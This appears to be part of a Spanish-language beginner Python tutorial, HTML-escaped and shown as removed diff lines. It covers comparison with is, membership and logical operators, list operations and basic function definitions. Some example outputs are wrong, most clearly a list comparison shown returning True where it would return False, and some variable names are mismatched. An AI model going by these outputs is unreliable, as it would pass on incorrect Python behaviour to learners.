-&lt;p&gt;En el resultado podemos apreciar que &lt;code&gt;is&lt;/code&gt; nos devuelve &lt;code&gt;False&lt;/code&gt; a diferencia de cuando aplicamos &lt;code&gt;==&lt;/code&gt; que nos devuelve &lt;code&gt;True&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;Esto se debe a que &lt;code&gt;==&lt;/code&gt; solo nos compara que las variables contengan el mismo valor, pero el &lt;code&gt;is&lt;/code&gt; nos compara que ambas variables sean el mismo objeto creado en la misma porcion de memoria en otras palabras si tienen el mismo identificador que nos mostraba la funcion &lt;code&gt;id()&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como en el caso siguente que crearemos una nueva variable &lt;code&gt;texto3&lt;/code&gt; y la igualaremos a la anterior variable que creamos &lt;code&gt;texto1&lt;/code&gt;, en este caso la variable &lt;code&gt;texto3&lt;/code&gt; heredara todo de la variable &lt;code&gt;texto1&lt;/code&gt; esto incluye la porcion de memoria en la que se creo.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto a la hora de ejecutar nuevamente el operador de identidad &lt;code&gt;is&lt;/code&gt; esta vez nos dara el valor de &lt;code&gt;True&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto3 = texto1
-
-texto3 is texto1
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;operadores-de-pertenencia&quot;&gt;Operadores de Pertenencia &lt;a href=&quot;#operadores-de-pertenencia&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los operadores de pertenencia se utilizan para evaluar sin una secuencia se encuentra presente en un objeto.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt;Ejemplo&lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;in&lt;/td&gt;
-      &lt;td&gt;x in y&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si la secuencia x se encuntra presente en y, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;not in&lt;/td&gt;
-      &lt;td&gt;x not in y&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si la secuencia x no se encuentra en y, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Veamoslo en un ejemplo:&lt;/p&gt;
-
-&lt;p&gt;Obervamos que si la secuencia en este caso &lt;code&gt;cadena&lt;/code&gt; esta presente en la variable &lt;code&gt;texto&lt;/code&gt;, esto nos responde &lt;code&gt;True&lt;/code&gt; ya que solo debe incluirse para que se cumpla esta condicion.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Mi cadena de texto&quot;
-
-&quot;cadena&quot; in texto
-
-True
-
-&quot;hola&quot; in texto
-
-False
-
-&quot;e&quot; in text
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero si intentamos hacer el mismo proceso en un numero entero, recibimos un error ya que el operador &lt;code&gt;in&lt;/code&gt; solo sirve para secuencias que son iterables&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 1345678
-
-1 in numero
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-7-882699b1f88c&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 1 in numero
-
-TypeError: argument of type 'int' is not iterable
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;operadores-logicos&quot;&gt;Operadores Logicos &lt;a href=&quot;#operadores-logicos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los operadores lógicos modifican y unen expresiones evaluadas en contexto booleano para crear condiciones más complejas.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt;Ejemplo&lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;not&lt;/td&gt;
-      &lt;td&gt;not x&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si x el &lt;code&gt;False&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;True&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;or&lt;/td&gt;
-      &lt;td&gt;x or y&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si x o y son &lt;code&gt;True&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;and&lt;/td&gt;
-      &lt;td&gt;x and y&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si ambos x como y son &lt;code&gt;True&lt;/code&gt;, de lo contrario devuelve &lt;code&gt;False&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h3 id=&quot;operador-not&quot;&gt;Operador not&lt;/h3&gt;
-
-&lt;p&gt;Evaluamos la expresion y con &lt;code&gt;not&lt;/code&gt; invierte el valor que nos devuelve una expresion&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 10
-
-numero &amp;lt; 20
-
-True
-
-not numero &amp;lt; 20
-
-False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;operador-or&quot;&gt;Operador or&lt;/h3&gt;
-
-&lt;p&gt;Observamos que el resultado nos devuelve &lt;code&gt;True&lt;/code&gt;, puesto que si bien la primera condicion es &lt;code&gt;False&lt;/code&gt;, con el uso del operador &lt;code&gt;or&lt;/code&gt; solo necesita devolver una de ellas &lt;code&gt;True&lt;/code&gt;, concretamente ya que la segunda condicion si se cumplia.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10
-
-numero2 = 20
-
-numero1 &amp;lt; 5
-
-False
-
-numero1 &amp;lt; 5 or numero2 &amp;gt; 10
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;operador-and&quot;&gt;Operador and&lt;/h3&gt;
-
-&lt;p&gt;El operador &lt;code&gt;and&lt;/code&gt; si requiere que se cumpla la evaluacion de todas las expresiones para que devuelva un valor &lt;code&gt;True&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 5
-
-numero2 = 10
-
-numero1 &amp;lt; 8 and numero2 &amp;gt; 15
-
-False
-
-numero1 &amp;lt; 10 and numero2 &amp;gt; 7
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;listas&quot;&gt;Listas &lt;a href=&quot;#listas&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Las listas son un tipo de dato complejo y particular en &lt;code&gt;Python3&lt;/code&gt;. Una lista se corresponde con una colección arbitraria de objetos. Las listas son similares a estructuras conocidas como arrays en otros lenguajes de programación pero con la diferencia de que en &lt;code&gt;Python3&lt;/code&gt; aportan mas flexibilidad.&lt;/p&gt;
-
-&lt;p&gt;En Python3 se representan con el tipo &lt;code&gt;list&lt;/code&gt; y la sintaxis que se utiliza para definirlas consiste en indicar una lista de objetos separados entre comas y encerrados entre corchetes: [objeto1, objeto2, …, objeton]&lt;/p&gt;
-
-&lt;p&gt;Veamoslo de manera practica&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Podemos una lista con datos numericos.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4, 5]
-
-type(lista)
-
-list
-
-print(lista)
-
-[1, 2, 3, 4, 5]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Tambien crear una lista con tipo de datos string&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista2 = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]
-
-type(lista2)
-
-list
-
-print(lista2)
-
-['texto1', 'texto2', 'texto3']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que tenemos una lista igual a la anterior pero con la diferencia que esta contiene cadenas de texto.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;El orden en el que se especifican los elementos cuando se define una lista es relevante y se mantiene durante toda su vida.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = ['n1', 'n2', 'n3']
-
-print(lista)
-
-['n1', 'n2', 'n3']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Podemos comparar las listas con los operadores mencionados anteriormente.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = ['n1', 'n2', 'n3']
-
-lista2 = ['n2', 'n1', 'n3']
-
-lista1 == lista2
-
-False
-
-'n1' in lista2
-
-True
-
-lista1 in lista2
-
-False
-
-lista1 == ['t1', 't2', 't3']
-
-True
-
-lista1 is lista2
-
-False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Las lista pueden contener distintos tipos de datos.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, &quot;hola&quot;, &quot;python&quot;]
-
-print(lista)
-
-[1, 2, 'hola', 'python']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una cosa super interesante es que una lista puede contener una &lt;code&gt;función&lt;/code&gt; estas las veremos mas adelante pero es importante mantenerlo presente&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def funcion():
-    print(&quot;Hola python&quot;)
-
-lista = [&quot;texto1&quot;, &quot;texto2&quot;, funcion]
-
-print(lista)
-
-['texto1', 'texto2', &amp;lt;function funcion at 0x0000012D476D0EE0&amp;gt;]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;acceso-a-elementos-de-una-lista&quot;&gt;Acceso a elementos de una lista&lt;/h2&gt;
-
-&lt;p&gt;Todas las variaciones vistas en la sección de strings (indexing, slicing, stride) aplican a las listas.&lt;/p&gt;
-
-&lt;h3 id=&quot;indexing&quot;&gt;indexing&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]
-
-lista[0]
-
-'texto1'
-
-lista[-1]
-
-'texto5'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;slicing-1&quot;&gt;slicing&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]
-
-lista[2:4]
-
-['texto3', 'texto4']
-
-lista[:3]
-
-['texto1', 'texto2', 'texto3']
-
-lista[2:]
-
-['texto3', 'texto4', 'texto5']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;stride-1&quot;&gt;stride&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]
-
-lista[0:4:2]
-
-['texto1', 'texto3'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;otra cosa interesante es que podemos utilizar el concepto de &lt;code&gt;stride&lt;/code&gt; para darle la vuelta a una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista
-
-['texto1', 'texto2', 'texto3', 'texto4', 'texto5']
-
-lista[::-1]
-
-['texto5', 'texto4', 'texto3', 'texto2', 'texto1']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Una de las pocas construcciones sintácticas en cuanto a la &lt;code&gt;indexación&lt;/code&gt; que cambia entre los &lt;code&gt;strings&lt;/code&gt; y las &lt;code&gt;listas&lt;/code&gt; es &lt;code&gt;[:]&lt;/code&gt;.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Cuando lo usamos nos devuelve una referencia al propio objeto&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto = &quot;Hola python&quot;
-
-texto[:]
-
-'Hola python'
-
-texto[:] is texto
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-&lt;ul&gt;
-  &lt;li&gt;Al utilizarlo con una &lt;code&gt;lista&lt;/code&gt; nos devuelve una copia del objetivo -&amp;gt; ojo no el mismo.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, 2, 3, 4]
-
-lista[:]
-
-[1, 2, 3, 4]
-
-lista[:] is lista
-
-False
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;operaciones-con-listas&quot;&gt;Operaciones con listas&lt;/h2&gt;
-
-&lt;p&gt;Las listas soportan muchos de los operadores y funciones de Python como los que vimos anteriormente.&lt;/p&gt;
-
-&lt;p&gt;Al sumar las listas estas se anidan&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]
-
-lista2 = [4, 5, 6]
-
-lista1 + lista2
-
-[1, 2, 3, 4, 5, 6]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Cuando usamos el operador de multiplicación, esto hace que se multipliquen sus mismos valores segun el numero por el cual se le multiplique.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]
-
-lista1 * 2
-
-[1, 2, 3, 1, 2, 3]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Tambien podemos ver la longitud, el valor &lt;code&gt;minimo&lt;/code&gt; y el &lt;code&gt;maximo&lt;/code&gt; de una lista&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista1 = [1, 2, 3]
-
-lista2 = [4, 5, 6]
-
-len(lista1)
-
-3
-
-min(lista1)
-
-1
-
-max(lista2)
-
-6
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Solo podemos hacer operaciones entre listas, ya que si tratamos de hacer operaciones con otros tipos en este caso un numero &lt;code&gt;int&lt;/code&gt; nos arrojara un error.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;[1, 2, 3] + 4
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-95-5842ff442cc5&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 [1, 2, 3] + 4
-
-TypeError: can only concatenate list (not &quot;int&quot;) to list
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;listas-anidadas&quot;&gt;Listas anidadas&lt;/h2&gt;
-
-&lt;p&gt;Como mencionamos anteriormente, una lista puede contener cualquier tipo de objeto. Esto incluye otra lista. Una lista puede contener sublistas, que a su vez pueden contener sublistas, y así sucesivamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]
-
-lista[0]
-
-1
-
-lista[1]
-
-[2, [3, 4], 5]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos acceder a un elemento de una sublista usaremos &lt;code&gt;[][]&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]
-
-lista[1][0]
-
-2
-
-lista[1][1]
-
-[3, 4]
-
-lista[1][1][0]
-
-3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Podemos anidar tantas listas como nuestro sistema soporte&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Es importante mencionar que si usamos &lt;code&gt;operadores&lt;/code&gt; en una &lt;code&gt;lista&lt;/code&gt; con &lt;code&gt;sublistas anidadas&lt;/code&gt;, estos solo se aplicaran a la primera, no lo haran de forma recursiva, y se deseariamos usarlos debemos aplicar el concepto de &lt;code&gt;indexing&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]
-
-[3, 4] in lista
-
-False
-
-lista[1]
-
-[2, [3, 4], 5]
-
-[3, 4] in lista[1]
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;las-listas-son-mutables&quot;&gt;Las listas son mutables&lt;/h2&gt;
-
-&lt;p&gt;Al contrario que los &lt;code&gt;strings&lt;/code&gt;, los elementos de las &lt;code&gt;listas&lt;/code&gt;si pueden modificarse&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]
-
-lista[0]
-
-'texto1'
-
-lista[0] = &quot;texto4&quot;
-
-lista
-
-['texto4', 'texto2', 'texto3']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos tambien podemos eliminar elementos una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]
-
-del lista[0]
-
-lista
-
-['texto2', 'texto3']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para realizar estas modificaciones tambien podemos usar los conceptos del &lt;code&gt;indexing&lt;/code&gt;, &lt;code&gt;slicing&lt;/code&gt; y &lt;code&gt;stride&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista
-
-['texto1', 'texto2']
-
-lista += [&quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]
-
-lista
-
-['texto1', 'texto2', 'texto3', 'texto4', 'texto5']
-
-lista[0:3]
-
-['texto1', 'texto2', 'texto3']
-
-lista[0:3] = [1, 2, 3]
-
-lista
-
-[1, 2, 3, 'texto4', 'texto5']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra cosa interesante es que el numeros de elementos seleccionados no tiene que ser igual a los que se asigne&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista[0:3]
-
-[1, 2, 3]
-
-lista[0:3] = [1, 2]
-
-lista
-
-[1, 2, 'texto4', 'texto5']
-
-lista[2:2] = [3, 4, 5]
-
-lista
-
-[1, 2, 3, 4, 5, 'texto4', 'texto5']
-
-lista[0:6] = []
-
-lista
-
-['texto5']
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;funciones&quot;&gt;Funciones &lt;a href=&quot;#funciones&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Antes de continuar con el contenido del curso se me hace necesario tocar ya el tema de funciones. Hemos visto distintos tipos de datos anteriormente, pero ahora vamos a profundizar en una de las estructuras principales de &lt;code&gt;python&lt;/code&gt; que son las &lt;code&gt;funciones&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Una función va a consistir en un bloque de código que va encapsular una tarea específica o un grupo de tareas relacionadas. Las funciones nos permiten dividir programas complejos en fragmentos más pequeños y modulares, de manera que podamos volver a utilizar estos fragmentos de codigo en un momento determinado de modo tal que no tenemos que volver a implementarlo.&lt;/p&gt;
-
-&lt;p&gt;En este caso vamos a invocar una función que ya viene definida en &lt;code&gt;python&lt;/code&gt;. Concretamente una que ya vimos antes de nombre &lt;code&gt;len&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar declarando una variable y lo siguiente sera ver como podemos invocar una función.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Para invocar la función debemos de poner el nombre de la función y entre parentesis ponemos los argumentos de la función. Esta función lo que hara es ejecutar una serie de lineas de codigo que estan definidas en alguna parte de &lt;code&gt;python&lt;/code&gt; y nos devuelve el numero de caracteres que contiene nuestra variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;len(variable)
-
-11
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora el resultado que nos devuelve la función, podemos asignarlo a otra variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;len_variable = len(variable)
-
-print(len_variable)
-
-11
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La función que se muestra anterioremente forma parte de un conjunto de funciones que estan definidas en el interprete de &lt;code&gt;Python&lt;/code&gt; y podemos utilizar siempre que lo necesitemos.&lt;/p&gt;
-
-&lt;p&gt;Para utilizar estas funciones no necesitamos conocer el detalle del código fuente que la implementa, únicamente necesitamos conocer:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Los argumentos recibe la función&lt;/li&gt;
-  &lt;li&gt;Los valores que devuelve&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Mas adelante veremos a detalle las funciones integradas de &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;funciones-personalizadas&quot;&gt;Funciones Personalizadas &lt;a href=&quot;#funciones-personalizadas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para poder definir funciones en &lt;code&gt;python&lt;/code&gt; la sintaxis utilizada es la siguiente:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def &amp;lt;nombre_funcion&amp;gt;([&amp;lt;parámetros&amp;gt;]):
-    &amp;lt;sentencia(s)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Debemos comenzar utilizando la palabra clave &lt;code&gt;def&lt;/code&gt; despues de un espacio ponemos el &lt;code&gt;nombre_función&lt;/code&gt; que queremos definir y entre &lt;code&gt;()&lt;/code&gt; los parametros que va a recibir nuestra función, la cual se va a traducir a los elementos que le vamos a proporcionar cuando la llamemos.&lt;/p&gt;
-
-&lt;p&gt;El elemento, &lt;code&gt;&amp;lt;sentencia(s)&amp;gt;&lt;/code&gt;, se denomina cuerpo de la función. El cuerpo es el bloque de sentencias en &lt;code&gt;Python&lt;/code&gt; que se ejecutará cuando se llame a la función. Cabe mencionar que el cuerpo de una función de Python se define por la sangría.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar definiendo nuestra función:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;def mi_funcion(argumento1, argumento2):
-    print(argumento1)
-    print(argumento2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como podemos visualizar he definico una función de nombre &lt;code&gt;mi_funcion&lt;/code&gt; que va a recibir 2 parametros &lt;code&gt;argumento1 y argumento2&lt;/code&gt; y el codigo que ejecutara sera con &lt;code&gt;print&lt;/code&gt; imprimirme por pantalla primero el &lt;code&gt;argumento1&lt;/code&gt; y segundo el &lt;code&gt;argumento2&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora para ejecutarla la función es super sencillo. La sintaxis debe ser la siguiente: &lt;code&gt;&amp;lt;nombre_funcion&amp;gt;([&amp;lt;argumentos&amp;gt;])&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Cabe resaltar que Los &lt;code&gt;&amp;lt;argumentos&amp;gt;&lt;/code&gt; son los valores que se pasan a la función. Se corresponden con los &lt;code&gt;&amp;lt;parámetros&amp;gt;&lt;/code&gt; en la definición de la función que asignamos.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Por lo tanto para llamar a la función, deberiamos hacerlo de la siguente manera:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
-
-Hola Python
-Adios Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Es importante mencionar que la ejecución de nuestro programa sera secuencial hasta que llegue a la &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para entendero mejor, supongamos que estoy defiendo un programa:&lt;/p&gt;
-
-&lt;p&gt;1.- Primero, ejecutar un print(“Curso Python”)
-2.- Segundo, llamare a mi función antes declarada, no sin olvidar añadir los parametros que necesita
-3.- Tercero, volvere a ejecutar un print(“Aprende Python”)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Curso Python&quot;)
-mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
-print(&quot;Aprendere Python&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como resultado tendre que el interprete de &lt;code&gt;python&lt;/code&gt; comenzara a ejecutar mi programa linea por linea.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Curso Python
-Hola Python
-Adios Python
-Aprendere Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Lo que quiero resaltar es que necesitamos crear funciones relacionadas con tareas especificas que realizen una acción particular, de tal modo que podamos volver a reutilizar.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Bueno por si habia duda tambien se pueden definir funciones que no reciban ningún argumento, pero los paréntesis siempre seran necesarios. Tanto en una definición de función como una llamada a una función deben incluir siempre paréntesis, incluso si están vacíos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion2():
-
-    print(&quot;Hola Python&quot;)
-    print(&quot;Adios Python&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;De tal modo que para ahora llamar a mi función solo debo de poner el nombre de las función y los &lt;code&gt;()&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion2()
-
-Hola Python
-Adios Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;argumentos-de-las-funciones&quot;&gt;Argumentos de las Funciones &lt;a href=&quot;#argumentos-de-las-funciones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los argumentos que podemos proporcionarle a una función en Python pueden ser de diferentes tipos.&lt;/p&gt;
-
-&lt;h3 id=&quot;argumentos-posicionales&quot;&gt;Argumentos Posicionales&lt;/h3&gt;
-
-&lt;p&gt;Como vimos anteriormente la forma más sencilla de pasar argumentos a una función en &lt;code&gt;Python&lt;/code&gt; es con argumentos posicionales (llamados tambien argumentos requeridos). En la definición de la función, debe especificarse una lista de parámetros separada por comas dentro de los paréntesis.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2, argumento3):
-    print(argumento1)
-    print(argumento2)
-    print(argumento3)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Los argumentos que le proporcionamos en la invocación de la función debe respetar el orden y el número de parámetros definidos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;, &quot;Grande Python&quot;)
-
-Hola Python
-Adios Python
-Grande Python
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si yo trato de llamar a la función, pero en lugar de pasarle los tres argumentos solo le paso dos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-12-c560729c0eac&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
-
-TypeError: mi_funcion() missing 1 required positional argument: 'argumento3'
-&lt;/code&gt;&lt;/pre&gt;
-
